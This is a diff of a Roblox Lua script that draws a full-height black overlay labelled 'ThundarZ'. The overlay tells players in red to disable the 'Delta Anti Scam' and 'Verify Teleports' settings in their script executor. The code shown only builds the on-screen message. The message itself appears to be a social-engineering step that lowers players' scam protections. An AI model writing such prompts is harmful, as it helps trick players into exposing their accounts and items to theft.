@@ -4,19 +4,20 @@ local playerGui = player:WaitForChild("PlayerGui")
 
 -- ScreenGui
 local screenGui = Instance.new("ScreenGui")
+screenGui.IgnoreGuiInset = true -- makes it cover even the top bar
 screenGui.Parent = playerGui
 
 -- Frame (covers half of the screen, thick black)
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0.5, 0, 1, 0) -- half screen width
 frame.Position = UDim2.new(0.25, 0, 0, 0) -- centered horizontally
-frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- pure black
-frame.BackgroundTransparency = 0 -- solid
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- solid black
+frame.BackgroundTransparency = 0
 frame.Parent = screenGui
 
 -- Top label (ThundarZ)
 local topText = Instance.new("TextLabel")
-topText.Size = UDim2.new(1, 0, 0.15, 0)
+topText.Size = UDim2.new(1, 0, 0.1, 0) -- smaller space at top
 topText.Position = UDim2.new(0, 0, 0, 0)
 topText.BackgroundTransparency = 1
 topText.Text = "ThundarZ"
@@ -34,7 +35,7 @@ middleText.TextWrapped = true
 middleText.TextScaled = true
 middleText.Font = Enum.Font.SourceSansBold
 middleText.TextColor3 = Color3.fromRGB(255, 0, 0) -- red
-middleText.Text = "TURN OFF DELTA ANTI SCAM AND TURN OFF VERIFY TELEPORTS TO WORK THIS SCRIPT"
+middleText.Text = "TURN OFF DELTA ANTI SCAM AND TURN OFF VERIFY TELEPORTS TO WORK THIS SCRIPT IT'S IN THE SETTING'S OF THE EXECUTER"
 middleText.Parent = frame
 
 -- Optional: fade out after few seconds
